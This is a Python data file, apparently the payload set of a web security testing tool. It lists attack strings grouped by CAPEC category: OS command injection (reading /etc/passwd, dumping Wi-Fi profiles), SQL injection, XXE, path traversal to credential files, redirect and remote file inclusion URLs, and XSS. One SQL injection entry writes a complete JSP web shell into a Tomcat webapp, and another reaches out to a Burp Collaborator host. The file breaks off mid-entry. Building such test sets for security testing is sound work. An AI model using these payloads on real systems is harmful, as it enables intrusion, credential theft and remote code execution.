__author__ = 'JG'

payload_data = {
    "capec_a1_command_injection": [
        {
            "capec_id": "15",
            "capec_description": "Command Delimiters",
            "payload_id": "Capec-CMDi-15-001",
            "payload_data": "&';echo exec(\"c:\\\\Windows\\\\system32\\\\ipconfig.exe\");'';';"
        },
        {
            "capec_id": "88",
            "capec_description": "OS Command Injection",
            "payload_id": "Capec-CMDi-88-001",
            "payload_data": "%26%26dir+c:%255c"
        },
        {
            "capec_id": "248",
            "capec_description": "Command Injection",
            "payload_id": "Capec-CMDi-248-001",
            "payload_data": "&'hostname"
        },
        {
            "capec_id": "v1",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v1-001",
            "payload_data": "&powershell -command \"get-acl\""
        },
        {
            "capec_id": "v2",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v2-001",
            "payload_data": "&'whoami"
        },
        {
            "capec_id": "v3",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v3-001",
            "payload_data": "%26net view"
        },
        {
            "capec_id": "v5",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v5-001",
            "payload_data": "&tracerpt lrt test.txt"
        },
        {
            "capec_id": "v7",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v7-001",
            "payload_data": "&cscript test.vbs"
        },
        {
            "capec_id": "v8",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v8-001",
            "payload_data": "%26netsh wlan show profile"
        },
        {
            "capec_id": "v9",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v9-001",
            "payload_data": "| net view"
        },
        {
            "capec_id": "v10",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v10-001",
            "payload_data": "; net view"
        },
        {
            "capec_id": "v11",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v11-001",
            "payload_data": "virsec.txt | ;ipconfig"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-001",
            "payload_data": "&& id"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-002",
            "payload_data": "`id`"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-003",
            "payload_data": "| id"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-004",
            "payload_data": "|| id"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-005",
            "payload_data": "; id"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-006",
            "payload_data": "| cat /etc/passwd"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-007",
            "payload_data": "&& cat /etc/passwd"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-008",
            "payload_data": "`cat /etc/passwd`"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-009",
            "payload_data": "; cat /etc/passwd"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-010",
            "payload_data": "|| cat /etc/passwd"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-011",
            "payload_data": "%3B%20cat%20/etc/passwd"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-012",
            "payload_data": "%7C%20cat%20%2Fetc%2Fpasswd"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-013",
            "payload_data": "%26%26%20id"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-014",
            "payload_data": "%60id%60"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-015",
            "payload_data": "%26echo%20fz54gfsgc4%20y5ik1s1zf%26"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-016",
            "payload_data": "%26echo%20css7ftgmb%20yho7bhs2al%26"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-017",
            "payload_data": "%26echo%20eznnkqagdt%20s9cvdg5fuz%26"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-018",
            "payload_data": "%26echo%20qak4bcvc7a%207h8pu148os%26"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-019",
            "payload_data": "%22%7cecho%20it7ybipw38%2000en666u5i%20%7c%7c"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-020",
            "payload_data": "%22%7cecho%20hssucd73on%20i7d5e8cb5h%20%7c%7c"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-021",
            "payload_data": "%7cecho%20dlumk8qluy%20gzkoyltv%7c%7ca%20%23'%20%7cecho%20dlumk8qluy%20gzkoyltv%7c%7ca%20%23%7c%22%20%7cecho%20dlumk8qluy%20gzkoyltv%7c%7ca%20%23"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-022",
            "payload_data": "%22%7cecho%20h5mf800nye%20duoyvgjxeq%20%7c%7c"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-023",
            "payload_data": "%22%7cecho%20hvnx0fmi31%20gyiml5mtx%20%7c%7c"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-024",
            "payload_data": "'%7cecho%20hy5jeo099m%20elwyffwip3%20%23xzwx"
        },
        {
            "capec_id": "virsec-16",
            "capec_description": "Command Injection",
            "payload_id": "Virsec-CMDi-v16-025",
            "payload_data": "%7cecho%203of2vmtff%20lj8jgcsht4%20%23xzwx"
        }
    ],
    "capec_a1_sql_injection": [
        {
            "capec_id": "7",
            "capec_description": "Blind SQL Injection",
            "payload_id": "Capec-SQLi-7-001",
            "payload_data": "'and ascii (substring (1,1)) = 49 - - "
        },
        {
            "capec_id": "52",
            "capec_description": "Embedding NULL Bytes",
            "payload_id": "Capec-SQLi-52-001",
            "payload_data": "%00' UNION SELECT password FROM Users WHERE username='admin'--"
        },
        {
            "capec_id": "53",
            "capec_description": "Postfix, Null Terminate, and Backslash",
            "payload_id": "Capec-SQLi-53-001",
            "payload_data": "a\\' OR \\'a\\'=\\'a"
        },
        {
            "capec_id": "64",
            "capec_description": "Using Slashes and URL Encoding Combined to Bypass Validation Logic",
            "payload_id": "Capec-SQLi-64-001",
            "payload_data": "union%20select%201,%2f%2a%21table_name%2a%2f,3%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29"
        },
        {
            "capec_id": "66",
            "capec_description": "SQL Injection",
            "payload_id": "Capec-SQLi-66-001",
            "payload_data": "\") or true--"
        },
        {
            "capec_id": "71",
            "capec_description": "Using Unicode Encoding to Bypass Validation Logic",
            "payload_id": "Capec-SQLi-71-001",
            "payload_data": "N'ʼ OR 1=1--"
        },
        {
            "capec_id": "72",
            "capec_description": "URL Encoding",
            "payload_id": "Capec-SQLi-72-001",
            "payload_data": "%31%27%29%3b%77%61%69%74%66%6f%72%20%64%65%6c%61%79%20%27%30%3a%30%3a%31%30%27%2d%2d%20"
        },
        {
            "capec_id": "78",
            "capec_description": "Using Escaped Slashes in Alternate Encoding",
            "payload_id": "Capec-SQLi-78-001",
            "payload_data": "123'%2b(select%20load_file('\\\\\\\\ej1lpill2170d5ddidnf93wai1oscjf76uwil.burpcollaborator.net\\\\hng'))%2b'"
        },
        {
            "capec_id": "79",
            "capec_description": "Using Slashes in Alternate Encoding",
            "payload_id": "Capec-SQLi-79-001",
            "payload_data": "0/**/union/*!50000select*/table_name`foo`/**/…"
        },
        {
            "capec_id": "108",
            "capec_description": "Command Line Execution through SQL Injection",
            "payload_id": "Capec-SQLi-108-001",
            "payload_data": "SELECT LOAD_FILE(0x633A5C626F6F742E696E69)"
        },
        {
            "capec_id": "120",
            "capec_description": "Double Encoding",
            "payload_id": "Capec-SQLi-120-001",
            "payload_data": "%250D%250Aadmin%2522%2Bor%2B%25221%2522%253D%25221%2522--"
        },
        {
            "capec_id": "470",
            "capec_description": "Expanding Control over the Operating System from the Database",
            "payload_id": "Capec-SQLi-470-001",
            "payload_data": "union select null,'<h1> Voila you got the system </h1><FORM METHOD=GET ACTION=\"cmdjsp.jsp\"><INPUT name=\"cmd\" type=text><INPUT type=submit value=\"Run\"></FORM><pre><%@ page import=\"java.io.*\" %><% String cmd = request.getParameter(\"cmd\"); String output = \"\"; if(cmd != null) { String s = null;try { Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) {out.println(s);}}catch(IOException e) {e.printStackTrace();}}%></pre>' INTO DUMPFILE 'D:\\\\tomcat-7.0.85\\\\webapps\\\\bookstore\\\\cmdjsp.jsp'-- "
        },
        {
            "capec_id": "66",
            "capec_description": "SQL Injection",
            "payload_id": "Capec-SQLi-66-001",
            "payload_data": " \") or true--"
        },
        {
            "capec_id": "66",
            "capec_description": "SQL Injection",
            "payload_id": "Capec-SQLi-66-001",
            "payload_data": "') or true--"
        },
        {
            "capec_id": "66",
            "capec_description": "SQL Injection",
            "payload_id": "Capec-SQLi-66-001",
            "payload_data": "' or 'x'='x"
        },
        {
            "capec_id": "110",
            "capec_description": "SQL Injection through SOAP Parameter Tampering ",
            "payload_id": "Capec-SQLi-110-001",
            "payload_data": "101 or 1=1"
        },
        {
            "capec_id": "7",
            "capec_description": "Blind SQL Injection",
            "payload_id": "Capec-SQLi-7-001",
            "payload_data": "101 AND 1=((SELECT pin FROM pins WHERE cc_number = '1111222233334444')=2364)"
        },
        {
            "capec_id": "7",
            "capec_description": "Blind SQL Injection",
            "payload_id": "Capec-SQLi-7-001",
            "payload_data": "101 AND (ascii( substr((SELECT first_name FROM user_data WHERE userid=15613) , 1 , 1) )=74 )"
        },
        {
            "capec_id": "52",
            "capec_description": "Embedding NULL Bytes",
            "payload_id": "Capec-SQLi-52-001",
            "payload_data": " UNION (SELECT @@version,null,null,null,null,null,null from dual) -- "
        },
        {
            "capec_id": "v1",
            "capec_description": "Random string with sleep function and comments",
            "payload_id": "Virsec-SQLi-v1-001",
            "payload_data": "FgsT8aod';select sleep(9); -- "
        },
        {
            "capec_id": "v2",
            "capec_description": "payload with OR case and some junk inside",
            "payload_id": "Virsec-SQLi-v2-001",
            "payload_data": "-1' OR 2+825-825-1=0+0+0+1 or 'HOGhgtZF'='"
        },
        {
            "capec_id": "v3",
            "capec_description": "OR with true keyword",
            "payload_id": "Virsec-SQLi-v3-001",
            "payload_data": ") or true--"
        },
        {
            "capec_id": "v4",
            "capec_description": "OR with like function",
            "payload_id": "Virsec-SQLi-v4-001",
            "payload_data": "or '2' like '2"
        },
        {
            "capec_id": "v5",
            "capec_description": "payload with URL encoding",
            "payload_id": "Virsec-SQLi-v5-001",
            "payload_data": "1%09and%091=1%09-- "
        },
        {
            "capec_id": "v6",
            "capec_description": "with comments inside",
            "payload_id": "Virsec-SQLi-v6-001",
            "payload_data": "snow'/*comment*/and/**/'1'='1"
        }
    ],
    "capec_a2_a3_insider_protect": [
        {
            "capec_id": "",
            "capec_description": "",
            "payload_id": "",
            "payload_data": ""
        }
    ],
    "capec_a4_xml_external_entity": [
        {
            "capec_id": "",
            "capec_description": "",
            "payload_id": "",
            "payload_data": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE comment [<!ELEMENT comment (Activity)><!ELEMENT Activity (#PCDATA)><!ENTITY xxe SYSTEM \"file:///C:/Windows/System32/drivers/etc/hosts\\\\\">]><comment><text>&xxe;</text></comment>"
        }
    ],
    "capec_a5_path_traversal": [
        {
            "capec_id": "139 \r\n",
            "capec_description": "Relative Path Traversal",
            "payload_id": "Capec-PT-139-001",
            "payload_data": "..\\..\\..\\..\\conf\\tomcat-users.xml\r\n\r\n"
        },
        {
            "capec_id": "139 \r\n",
            "capec_description": "Relative Path Traversal",
            "payload_id": "Capec-PT-139-001",
            "payload_data": "../../../../conf/tomcat-users.xml"
        },
        {
            "capec_id": "76",
            "capec_description": "Manipulating Web Input to File System Calls",
            "payload_id": "Capec-PT-76-001",
            "payload_data": "..\\..\\..\\..\\conf\\tomcat-users.xml\r\n"
        },
        {
            "capec_id": "76",
            "capec_description": "Manipulating Web Input to File System Calls",
            "payload_id": "Capec-PT-76-001",
            "payload_data": "../../../../conf/tomcat-users.xml"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-001",
            "payload_data": "..\\..\\..\\..\\conf\\tomcat-users.xml"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-002",
            "payload_data": "../../../../conf/tomcat-users.xml"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-003",
            "payload_data": "../../../../../../../../../etc/passwd"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-004",
            "payload_data": "..\\..\\..\\..\\RUNNING.txt"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-005",
            "payload_data": "../../../../RUNNING.txt"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-006",
            "payload_data": "..2f..2fetc2fpasswd%00"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-007",
            "payload_data": "..2f..2f..2fetc2fpasswd"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-008",
            "payload_data": "..2f..2f..2fetc2fpasswd%00"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-009",
            "payload_data": "..2f..2f..2f..2fetc2fpasswd"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-010",
            "payload_data": "..2f..2f..2f..2fetc2fpasswd%00"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-011",
            "payload_data": "..2f..2f..2f..2f..2fetc2fpasswd"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-012",
            "payload_data": "..2f..2f..2f..2f..2fetc2fpasswd%00"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-013",
            "payload_data": "../../../../../../../../../etc/passwd"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-014",
            "payload_data": "../../../../../../../../etc/passwd"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-015",
            "payload_data": "../../../../../../../etc/passwd"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-016",
            "payload_data": "../../../../../../etc/passwd"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-017",
            "payload_data": "../../../../../etc/passwd"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-018",
            "payload_data": "../../../../etc/passwd"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-019",
            "payload_data": "../../../etc/passwd"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-020",
            "payload_data": "../../etc/passwd"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-021",
            "payload_data": "../etc/passwd"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-022",
            "payload_data": "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-023",
            "payload_data": ".\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-024",
            "payload_data": "\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-025",
            "payload_data": "/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-026",
            "payload_data": "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%  25%5c..%25%5c..%00"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-027",
            "payload_data": "/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-028",
            "payload_data": "../boot.ini"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-029",
            "payload_data": "../../boot.ini"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-030",
            "payload_data": "../../../boot.ini"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-031",
            "payload_data": "../../../../boot.ini"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-032",
            "payload_data": "../../../../../boot.ini"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-033",
            "payload_data": "../../../../../../boot.ini"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-034",
            "payload_data": "../../../../../../../boot.ini"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-035",
            "payload_data": "../../../../../../../../boot.ini"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-036",
            "payload_data": "..%2fboot.ini"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-037",
            "payload_data": "..%2f..%2fboot.ini"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-038",
            "payload_data": "..%2f..%2f..%2fboot.ini"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-039",
            "payload_data": "..%2f..%2f..%2f..%2fboot.ini"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-040",
            "payload_data": "..%2f..%2f..%2f..%2f..%2fboot.ini"
        },
        {
            "capec_id": "126",
            "capec_description": "Path Traversal",
            "payload_id": "Capec-PT-126-041",
            "payload_data": "%2e%2e/boot.ini"
        }
    ],
    "caped_a5_remote_file_inclusion": [
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-001",
            "payload_data": "http://fossilinsects.net/"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-002",
            "payload_data": "//virsec%00.com"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-003",
            "payload_data": "/\\virsec%252ecom"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-004",
            "payload_data": "virsec%252ecom"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-005",
            "payload_data": "<>//virsec.com"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-006",
            "payload_data": "/<>//virsec.com"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-007",
            "payload_data": "//;@virsec.com"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-008",
            "payload_data": "///;@virsec.com"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-009",
            "payload_data": "/////virsec.com/"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-010",
            "payload_data": "/////virsec.com"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-011",
            "payload_data": "@virsec.com"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-012",
            "payload_data": "\\/\\/virsec.com/"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-013",
            "payload_data": "〱virsec.com"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-014",
            "payload_data": "virsec.com"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-015",
            "payload_data": "virsec.com%23@whitelisted.com"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-016",
            "payload_data": "////virsec.com/%2e%2e"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-017",
            "payload_data": "///virsec.com/%2e%2e"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-018",
            "payload_data": "//virsec.com/%2e%2e"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-019",
            "payload_data": "/virsec.com/%2e%2e"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-020",
            "payload_data": "//virsec.com/%2E%2E"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-021",
            "payload_data": "////virsec.com/%2e%2e%2f"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-022",
            "payload_data": "///virsec.com/%2e%2e%2f"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-023",
            "payload_data": "//virsec.com/%2e%2e%2f"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-024",
            "payload_data": "////virsec.com/%2f.."
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-025",
            "payload_data": "///virsec.com/%2f.."
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-026",
            "payload_data": "//virsec.com/%2f.."
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-027",
            "payload_data": "//virsec.com/%2F.. "
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-028",
            "payload_data": "/virsec.com/%2F.. "
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-029",
            "payload_data": "////virsec.com/%2f%2e%2e"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-030",
            "payload_data": "///virsec.com/%2f%2e%2e"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-031",
            "payload_data": "//virsec.com/%2f%2e%2e"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-032",
            "payload_data": "/virsec.com/%2f%2e%2e"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-033",
            "payload_data": "//virsec.com//%2F%2E%2E"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-034",
            "payload_data": "//virsec.com:80?@whitelisted.com/"
        },
        {
            "capec_id": "Virsec1\r\n",
            "capec_description": "RFI",
            "payload_id": "Capec-RFI-V1-035",
            "payload_data": "//virsec.com:80#@whitelisted.com/"
        }
    ],
    "capec_a6": [
        {
            "capec_id": "",
            "capec_description": "",
            "payload_id": "",
            "payload_data": ""
        }
    ],
    "capec_a7_reflected_xss": [
        {
            "capec_id": "18",
            "capec_description": "XSS Targeting Non-Script Elements",
            "payload_id": "Capec-XSS-18-001",
            "payload_data": "<iMg srC=1 lAnGuAGE=VbS oNeRroR=mSgbOx(1)>"
        },
        {
            "capec_id": "18",
            "capec_description": "XSS Targeting Non-Script Elements",
            "payload_id": "Capec-XSS-18-001",
            "payload_data": "<name>\r\n  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>\r\n</name>"
        },
        {
            "capec_id": "19",
            "capec_description": "Embedding Scripts within Scripts",
            "payload_id": "Capec-XSS-19-001",
            "payload_data": "<IMG SRC=javascript:alert('XSS')>"
        },
        {
            "capec_id": "32",
            "capec_description": "XSS Through HTTP Query Strings",
            "payload_id": "Capec-XSS-32-001",
            "payload_data": "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
        },
        {
            "capec_id": "32",
            "capec_description": "XSS Through HTTP Query Strings",
            "payload_id": "Capec-XSS-32-001",
            "payload_data": "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">"
        },
        {
            "capec_id": "43",
            "capec_description": "Exploiting Multiple Input Interpretation Layers ",
            "payload_id": "Capec-XSS-43-001",
            "payload_data": "<script>alert('hacked');</script>>"
        },
        {
            "capec_id": "63",
            "capec_description": "Cross-Site Scripting (XSS)",
            "payload_id": "Capec-XSS-63-001",
            "payload_data": "<script>throw~delete~typeof~prompt(1)</script>"
        },
        {
            "capec_id": "63",
            "capec_description": "Cross-Site Scripting (XSS)",
            "payload_id": "Capec-XSS-63-001",
            "payload_data": "<SCRIPT>document.write(\"XSS\");</SCRIPT>"
        },
        {
            "capec_id": "86",
            "capec_description": "XSS Through HTTP Headers",
            "payload_id": "Capec-XSS-86-001",
            "payload_data": "<iframe src=\"http://www.victim.com/?v=<script>if\">"
        },
        {
            "capec_id": "86",
            "capec_description": "XSS Through HTTP Headers",
            "payload_id": "Capec-XSS-86-001",
            "payload_data": "http://www.google<script .com>alert(document.location)</script"
        },
        {
            "capec_id": "86",
            "capec_description": "XSS Through HTTP Headers",
            "payload_id": "Capec-XSS-86-001",
            "payload_data": "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\">test</a>"
        },
        {
            "capec_id": "198",
            "capec_description": "XSS Targeting Error Pages",
            "payload_id": "Capec-XSS-198-001",
            "payload_data": "%u3008img%20src%3D%221%22%20onerror%3D%22alert(%uFF071%uFF07)%22%u232A"
        },
        {
            "capec_id": "198",
            "capec_description": "XSS Targeting Error Pages",
            "payload_id": "Capec-XSS-198-001",
            "payload_data": "<img src='1' onerror\\x00=alert(0) />"
        },
        {
            "capec_id": "198",
            "capec_description": "XSS Targeting Error Pages",
            "payload_id": "Capec-XSS-198-001",
            "payload_data": "<img src='1' o\\x00nerr\\x00or=alert(0) />"
        },
        {
            "capec_id": "199",
            "capec_description": "XSS Using Alternate Syntax",
            "payload_id": "Capec-XSS-199-001",
            "payload_data": "<iMg srC=1 lAnGuAGE=VbS oNeRroR=mSgbOx(1)>"
        },
        {
            "capec_id": "199",
            "capec_description": "XSS Using Alternate Syntax",
            "payload_id": "Capec-XSS-199-001",
            "payload_data": "<iMg SrC=x OnErRoR=window.location=123>"
        },
        {
            "capec_id": "199",
            "capec_description": "XSS Using Alternate Syntax",
            "payload_id": "Capec-XSS-199-001",
            "payload_data": "<INPUT TYPE=\"IMAGE\" id=XSS SRC=\"javascript:alert('XSS');\">"
        },
        {
            "capec_id": "209",
            "capec_description": "XSS Using MIME Type Mismatch",
            "payload_id": "Capec-XSS-209-001",
            "payload_data": "<IMG SRC=\" &#14;  javascript:alert('XSS');\">"
        },
        {
            "capec_id": "243",
            "capec_description": "XSS Targeting HTML Attributes",
